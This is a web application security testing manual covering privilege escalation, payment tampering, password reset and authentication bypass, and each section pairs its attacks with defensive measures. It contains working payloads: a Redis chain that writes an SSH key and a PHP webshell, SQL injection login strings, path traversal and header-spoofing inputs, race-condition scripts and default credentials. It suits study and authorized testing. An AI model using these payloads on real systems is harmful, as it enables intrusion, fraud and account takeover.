# Web Logic and Authentication Security

> **Source**: Distilled from WooYun vulnerability database of 88,636 real vulnerabilities, covering logic flaws (8,292) and unauthorized access (14,377)
> **Purpose**: Practical reference manual for logic vulnerabilities and authentication bypass in web application security testing

---

## I. Privilege Escalation Vulnerabilities

### 1.1 Vulnerability Root Cause

The root cause of privilege escalation vulnerabilities is **missing or incomplete authorization checks** — the server fails to verify whether the requester has the corresponding permission on each resource operation.

| Type | Definition | Root Cause | Risk Level |
|------|-----------|-----------|-----------|
| Horizontal privilege escalation | Cross-boundary access between same-level users | Resource ownership not validated | High |
| Vertical privilege escalation | Low-privilege users performing high-privilege operations | Role permissions not validated | Critical |

### 1.2 Horizontal Privilege Escalation (IDOR)

**High-frequency scenarios and exploitation methods:**

```
Scenario 1: ID Enumeration — auto-increment IDs are predictable
GET /address/edit/?addid=100001  → Own address
GET /address/edit/?addid=100002  → Another user's address (unauthorized access)

Scenario 2: Resource Replacement Attack — modification operation lacks ownership validation
Account A creates invoice ID=1001 → Account B replaces ID=1001 during modification → A's invoice is overwritten

Scenario 3: API Parameter Enumeration — interface only validates login, not permissions
/personal/center/family/{id}/edit → Replacing id leaks other users' information
```

**Testing Method:**
1. Capture and record ID parameters in normal requests (uid/orderId/addid, etc.)
2. Replace with another user's ID and observe the response
3. Automated enumeration (Burp Intruder or script)
4. Focus on CRUD operations; modification and deletion cause the most harm

```python
# IDOR automated detection approach
def idor_test(base_url, param_name, id_range, session_cookie):
    for id in range(id_range[0], id_range[1]):
        resp = requests.get(
            f"{base_url}?{param_name}={id}",
            cookies={"session": session_cookie}
        )
        if resp.status_code == 200 and "sensitive_data_pattern" in resp.text:
            print(f"[!] IDOR: {param_name}={id}")
```

**Privilege Escalation Testing Matrix:**

| Operation Type | Testing Method | Risk Level |
|---------------|---------------|-----------|
| Read | Replace resource ID | Medium |
| Modify | Replace resource ID + data | High |
| Delete | Replace resource ID | Critical |
| Create | Replace owner user ID | High |

### 1.3 Vertical Privilege Escalation

**Core exploitation methods:**

```http
# Normal user tampering with role identifier during profile update
POST /updateUser HTTP/1.1
user.aid=3&user.name=test   # aid=3 normal user

# Tampered to administrator
POST /updateUser HTTP/1.1
user.aid=1&user.name=test   # aid=1 super administrator
```

**Detection key points:**
- Enumerate role IDs: typically 1=super admin, 2=admin, 3+=regular user
- Test role switching: modify role identifiers in requests (role/aid/type/level)
- Low-privilege account directly accessing admin interface URLs
- Tamper with permission identifiers: `isAdmin=0->1`, `role=user->admin`

### 1.4 Defensive Measures

- Enforce ownership validation before resource access: `WHERE id=? AND user_id=current_user`
- Use UUID instead of auto-increment IDs to prevent enumeration
- Log audit trails for sensitive operations
- Implement least privilege principle, authenticate per endpoint on the backend
- Centralize permission validation logic (middleware/interceptor)

---

## II. Payment Logic Vulnerabilities

### 2.1 Vulnerability Root Cause

The core of payment vulnerabilities is **trust boundary errors** — pushing sensitive logic such as price calculation to the client side without independent server-side validation.

```
Security model: Untrusted zone (client) -> Trust boundary -> Trusted zone (server)
Incorrect implementation: Directly accept the price submitted by the client as ground truth
Correct implementation: Client only provides product ID; server independently queries and calculates price
```

### 2.2 Common Scenarios and Exploitation Techniques

**Scenario 1: Direct Amount Tampering**

```http
# Original request
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":299.00}

# Tampered request
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":0.01}
```

**Scenario 2: Coupon/Discount Logic Abuse**

```
1. Purchase product A (¥59), triggering "buy ¥59+ to exchange for B (¥5.9)"
2. Place order for A+B, pay ¥64.9
3. Cancel product A, keep only B
4. Effectively purchased product B (original price ¥21) for ¥5.9

Test approach: cancel part of a combined order, return after coupon use, refund after points redemption
```

**Scenario 3: Virtual Currency Farming**
- Registration referral earns points → brute-force CAPTCHA for mass registrations → redeem points for physical goods

**Scenario 4: Quantity/Negative Number Attack**
- `count=1 -> count=-1` (negative triggers refund)
- `price=100 -> price=-100` (negative amount)

### 2.3 Systematic Testing Method

```
Phase 1: Parameter Fingerprinting
  - Capture order creation interface
  - Identify price parameters (price/amount/total/cost/discount)
  - Determine parameter type (integer/float/string)

Phase 2: Boundary Value Testing
  - Minimum value: 0, 0.01
  - Negative: -1, -100, -0.01
  - Format: scientific notation (1e-10), nested JSON
  - Precision: float overflow, rounding errors

Phase 3: Logic Bypass
  - Parameter redundancy: submit multiple price parameters
  - Parameter override: increase then decrease price
  - Coupon stacking: double manipulation of price + discount
  - Cancel part of combined order / return items

Phase 4: Payment Flow Validation at Each Step
  - Order creation → check order amount
  - Payment redirect → verify payment amount
  - Payment callback → forge callback signature
  - Refund process → check refund amount
```

**Advanced Exploitation Techniques:**

```python
# Price tampering + race condition
import threading
def create_order():
    requests.post("/order/create", json={"price":0.01,"productId":"premium"})
threads = [threading.Thread(target=create_order) for _ in range(50)]
for t in threads: t.start()
```

```http
# Parameter pollution: some frameworks process duplicate parameters
POST /order/create?price=299.00&price=0.01

# Type conversion bypass
{"price":"0.01"}     string
{"price":1e-10}      scientific notation
{"price":null}       NULL injection
```

### 2.4 Defensive Measures

```
Layer 1 Input Validation: Accept only product ID, not price; amount must be positive with at most 2 decimal places
Layer 2 Business Logic: Server independently calculates price; reject/manual review when price deviates from threshold
Layer 3 Data Integrity: Order signing (HMAC) prevents tampering; timestamps prevent replay; idempotency prevents duplication
Layer 4 Payment Validation: Callback amount = order amount; strict state machine; full-chain audit logging
```

---

## III. Password Reset Vulnerabilities

### 3.1 Vulnerability Root Cause

The essence of password reset vulnerabilities is **broken identity verification chain** — a step in the reset flow fails to correctly bind to the user's identity.

### 3.2 Four Vulnerability Patterns

**Pattern A: Verification Code Echoed in Response**

```http
POST /sendSmsCode HTTP/1.1
phone=13888888888

# Response directly contains the verification code
{"code":0,"data":{"verifyCode":"123456"}}
```

Detection method: Intercept the response to the send-code request and search for 4-6 digit numbers.

**Pattern B: Verification Code Unbound from User**

```
1. Receive verification code A on your own phone number
2. Initiate password recovery for the target account
3. Complete verification using code A (not bound to user identity)
Root cause: Verification code only checks validity, not ownership
```

**Pattern C: Reset Steps Can Be Skipped**

```
Normal: Enter account → Identity verification → Reset password → Complete
Attack: Enter account → [skip] → Directly access reset password page

Implementation:
1. Analyze frontend JS to find step URLs
2. Directly access step 3 URL
3. Modify DOM via F12: hide verification step, show reset step
```

**Pattern D: Credential Parameters Are Controllable**

```http
POST /resetPassword HTTP/1.1
username=victim&newPassword=hacked123
# Vulnerability: username comes from client, can be tampered to any user
```

### 3.3 Testing Process

```
Initiate password reset
  +-- Capture and analyze response → does it contain verification code? → Pattern A
  +-- Analyze verification flow
  |     +-- Multi-step → attempt to skip intermediate steps → Pattern C
  |     +-- Single-step → check parameter binding
  |           +-- User ID controllable → parameter tampering → Pattern D
  |           +-- Bound to Session → session fixation testing
  +-- Verification code mechanism
        +-- Is verification code bound to user? → Pattern B
        +-- Is verification code brute-forceable? (no rate limit)
        +-- Does verification code have a time limit?
```

### 3.4 Defensive Measures

- Bind verification code to user Session, validate ownership
- Verification code single-use + 60-second expiry
- Reset token one-time use, unpredictable
- Full-flow server-side state validation, no step skipping allowed
- Lock after 5 failed attempts to prevent brute force

---

## IV. Business Logic Flaws

### 4.1 Vulnerability Root Cause Matrix

| Layer | Flaw Type | Typical Manifestation |
|-------|----------|----------------------|
| Business layer | Process design flaw | Steps skippable, state forgeable |
| Interface layer | Excessive parameter trust | Client-side validation, server not verifying |
| Authentication layer | Credential management flaw | Token leakage, session fixation |
| Authorization layer | Fuzzy permission boundaries | Horizontal/vertical privilege escalation |

### 4.2 CAPTCHA Bypass

**Bypass Method 1: CAPTCHA Does Not Refresh**
- CAPTCHA does not auto-refresh after login failure; the same code can be reused
- Exploitation: manually solve once, brute-force password with fixed CAPTCHA

**Bypass Method 2: CAPTCHA Is Brute-Forceable**
- 4-6 pure numeric digits, no attempt/rate limit
- Brute-force space: 10,000–1,000,000; with 30 threads completes in ~30 seconds

**Bypass Method 3: Frontend Validation Only**
- CAPTCHA validated only in frontend JS; deleting frontend validation code or calling the interface directly bypasses it

**CAPTCHA Security Checklist:**
- Is the verification code leaked in the response?
- Is it bound to Session/user?
- Does it have a time limit? (recommend 60 seconds)
- Is a refresh forced on verification failure?
- Is there a rate limit? (recommend 5 attempts/minute)
- Is complexity sufficient? (recommend 6 alphanumeric characters)

### 4.3 Race Condition

Applicable scenarios: coupon redemption, points exchange, inventory deduction, balance payment

```python
import threading, requests
def redeem():
    requests.post("/redeem", data={"points":1000, "item":"iPhone"})

# 100 concurrent attempts to redeem the same points multiple times
threads = [threading.Thread(target=redeem) for _ in range(100)]
for t in threads: t.start()
```

Root cause: Balance check and balance deduction are not atomic operations; concurrent requests can pass the check multiple times.

### 4.4 Systematic Parameter Tampering Methods

| Parameter Type | Tampering Direction | Example |
|---------------|--------------------|-|
| User ID | Replace with another user | uid=1001->1002 |
| Amount | Decrease/zero/negative | price=100->0.01 |
| Quantity | Negative | count=1->-1 |
| Status | Flip boolean | isPaid=false->true |
| Role | Elevate permissions | role=user->admin |
| Time | Extend validity | expireTime->2099-12-31 |

### 4.5 Business Process Reverse Analysis Method

```
Step 1: Draw complete business process flow diagram
Step 2: Identify validation points at each step
Step 3: Evaluate whether validation is bypassable (frontend/backend? replayable? parameter-controlled?)
Step 4: Design bypass test cases

Example (password reset flow):
[Enter account] -> [Send code] -> [Verify identity] -> [Set new password]
       |               |                |                    |
  Account enumeration  Code leakage  Step skipping   Parameter tampering
```

### 4.6 Defensive Principles

- **Server authority**: All validation done server-side; frontend validation is UX only
- **Atomic operations**: Critical business operations (deduction/inventory) use transactions + locks
- **State machine**: Business flow strictly follows state machine, no step skipping
- **Anti-replay**: Critical interfaces are idempotency-designed with timestamp + signature

---

## V. Authentication Bypass

### 5.1 Vulnerability Root Cause

The core of authentication bypass is **the trust chain being broken**: the system incorrectly trusts identity claims from untrusted sources.

### 5.2 Cookie/Session Forgery

```
# Directly write to Cookie to obtain identity
GET /registeruser/CookInsert?userAccount=admin&inner=1
-> Write admin identity to Cookie, directly obtain admin Session

# Identity identifiers in Cookie are predictable
Cookie: admin=true; userId=1
-> Modifying Cookie values switches identity
```

JWT Bypass:

| Technique | Payload |
|-----------|---------|
| Null algorithm | alg: none |
| Weak key | Brute-force HS256 key |
| Algorithm confusion | RS256 to HS256, sign with public key |

### 5.3 Response Tampering Bypass

```
Normal: Request verification → {"status":"0","msg":"Code error"} → Stay on verification page
Attack: Request verification → Intercept response → Modify to {"status":"1","msg":"Success"} → Proceed to next step
```

Applicable condition: Client controls flow based on response status + server does not re-validate in subsequent steps.

### 5.4 IP Spoofing/Header Bypass

```http
# Common headers to bypass IP whitelists
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Host: localhost
```

### 5.5 Path Bypass

```
# Case confusion
/ADMIN/  /Admin/  /aDmIn/

# URL encoding bypass
%2e%2e%2f = ../
%252e%252e%252f = ../ (double encoding)

# Null byte truncation
../../../etc/passwd%00.jpg

# Suffix addition bypass
/admin -> /admin/  /admin;.js  /admin%23
```

### 5.6 Unauthorized Backend Access

High-frequency unauthorized paths:

```
# Web middleware
/console/              (WebLogic)
/manager/html          (Tomcat)
/jmx-console/          (JBoss)
/actuator/env          (Spring Boot)
/actuator/heapdump     (Spring Boot, can leak passwords)

# API interfaces
/swagger-ui.html       (API docs)
/api-docs              (API docs)
/api/configs           (config leakage)

# Debug/administration
/admin/index.jsp
/phpMyAdmin/
/druid/index.html      (Druid monitoring)
```

Middleware default credentials quick reference:

| Middleware | Common Weak Passwords |
|-----------|----------------------|
| Tomcat | admin:admin, tomcat:tomcat |
| WebLogic | weblogic:weblogic, weblogic:12345678 |
| JBoss | admin:admin (or no auth) |

### 5.7 Database/Service Unauthorized Access

| Service | Port | Verification Command | Exploitation Method |
|---------|------|---------------------|---------------------|
| Redis | 6379 | redis-cli -h IP info | Write SSH key/Webshell/crontab |
| MongoDB | 27017 | mongo IP:27017 | Direct connection without auth, export all data |
| Elasticsearch | 9200 | curl IP:9200/_cat/indices | Read index data |
| Memcached | 11211 | echo stats, nc IP 11211 | Data leakage |
| Docker API | 2375 | curl IP:2375/info | Container escape/RCE |

Redis unauthorized access exploit chain (high severity):

```bash
redis-cli -h target
# Write SSH public key
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n"
save

# Write Webshell
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php system($_GET['c']);?>"
save
```

### 5.8 Session Bypass

```
# Session ID leakage (logs/URL)
/logs/ctp.log -> contains Session ID -> use directly

# Session fixation attack
Force user to use a Session ID specified by the attacker

# Session prediction
Weak Sessions generated from timestamps/sequence numbers → next Session is predictable
```

### 5.9 Magic Passwords (SQL Injection Login)

```
Username: ' or 1=1--
Password: anything

Username: admin'--
Password: anything
```

### 5.10 Authentication Bypass Testing Checklist

| Test Item | Method | Tool |
|-----------|--------|------|
| Cookie forgery | Modify user identifier fields | BurpSuite |
| Session fixation | Reuse another person's Session | Packet capture tool |
| Response tampering | Modify returned status code | BurpSuite |
| IP spoofing | Add X-Forwarded-For | curl/Burp |
| Frontend bypass | Modify JS logic | DevTools |
| JWT tampering | Null algorithm/weak key | jwt.io/hashcat |
| Path bypass | Case variation/encoding/truncation | Manual + dictionary |
| Weak passwords | Try default credentials | Hydra |
| SQL injection login | Magic passwords | Manual |

### 5.11 Defensive Measures

| Layer | Measures |
|-------|---------|
| Network | Internal services not exposed to public internet, access via VPN/bastion host |
| Authentication | Enforce complex passwords, disable default accounts, enable MFA |
| Authorization | Backend validates permissions per endpoint, least privilege principle |
| Session | Regenerate SessionID after login, HttpOnly+Secure |
| Monitoring | Anomalous login alerts, failure count lockout, audit logging |
| Hardening | Disable debug interfaces, remove default admin pages |

---

## VI. Systematic Testing Framework

### 6.1 Four-Phase Testing Method

```
Phase 1: Intelligence Gathering
  - Enumerate all feature points and interfaces
  - Draw business process flow diagram
  - Identify sensitive operations (payment/reset/permission changes)
  - Determine parameter controllability

Phase 2: Threat Modeling
  - Analyze input parameters and trust boundaries for each interface
  - Mark server-side vs frontend validation
  - Build attack tree (categorized by privilege escalation/payment/authentication)
  - Prioritize (high impact × high likelihood)

Phase 3: Vulnerability Validation
  - Test in priority order
  - Record PoC (request/response screenshots)
  - Assess impact scope (data volume/user count/amount)

Phase 4: Report Output
  - Vulnerability description + reproduction steps
  - Root cause analysis + impact assessment
  - Remediation advice (short-term + long-term)
  - Risk rating (CVSS)
```

### 6.2 High-Frequency Vulnerability Pattern Quick Reference

| Vulnerability Pattern | Detection Signal | Quick Validation Method |
|----------------------|-----------------|------------------------|
| IDOR | URL/parameter contains auto-increment ID | Replace ID and check if another user's data is returned |
| Amount tampering | Request contains price/amount | Change to 0.01 and observe the order |
| Code echoed in response | Capture response after sending code | Search response for 4-6 digit numbers |
| Step skipping | Multi-step process | Directly access subsequent step URL |
| Response tampering | Client redirects based on status | Change status=1 to see if it passes |
| Unauthorized backend | Directory scan finds admin path | Directly access to see if login is required |
| Weak passwords | Login page discovered | Try admin/admin and other default credentials |
| Race condition | Balance/inventory/coupon operations | Send 50+ concurrent requests to see if over-deducted |

### 6.3 Recommended Practical Tools

| Tool | Core Use | Applicable Scenario |
|------|---------|---------------------|
| BurpSuite | Traffic interception, parameter tampering, replay | Core tool for all scenarios |
| Postman | API testing, batch requests | Interface logic testing |
| Hydra | Password brute-forcing | Weak passwords/credential stuffing |
| OWASP ZAP | Automated scanning | Initial discovery |
| Custom scripts | Concurrent testing, ID enumeration | Race conditions/IDOR |

---

*Document version: v1.0*
*Data source: WooYun vulnerability database (88,636 entries): logic flaws (8,292) + unauthorized access (14,377)*
*Generated: 2026-02-06*
